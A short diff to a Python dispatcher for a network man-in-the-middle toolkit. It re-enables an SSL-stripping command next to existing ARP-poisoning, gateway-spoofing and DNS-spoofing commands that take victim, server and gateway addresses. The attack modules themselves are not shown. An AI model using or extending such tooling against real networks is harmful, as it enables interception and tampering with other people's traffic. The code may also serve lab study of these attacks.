@@ -2,7 +2,7 @@ import config
 import arp_poison
 import dns_spoof
 import arp_mitm_gateway
-#import ssl_strip
+import ssl_strip
 import recon
 import os
 import sys
@@ -65,14 +65,15 @@ def main():
         print("ARP Poisoning...")
         arp_poison.arp_poison(ipVictimLAN, macVictimLAN, ipServerLAN, macAttackerLAN, interfaceLAN)
     elif sys.argv[1] == "dns":
-        print("DNS spoofing...")
+        print("DNS Spoofing...")
         dns_spoof.dns_spoof()
     elif sys.argv[1] == "arp_patient":
         arp_poison.arp_listener(macAttackerLAN, interfaceLAN)
     elif sys.argv[1] == "arp_gateway":
         arp_mitm_gateway.spoof(ipGateway, ipAttackerNAT, ipVictimNAT, macGateway, macAttackerNAT, macVictimNAT, interfaceNAT)
-    #elif sys.argv[1] == "ssl":
-        #ssl_strip.start_strip(interface)
+    elif sys.argv[1] == "ssl":
+        print("SSL Stripping...")
+        ssl_strip.ssl_strip()
     else:
         print("Unknown command: {}. Use either 'arp', 'dns', or 'ssl'".format(sys.argv[1]))
         sys.exit(1)
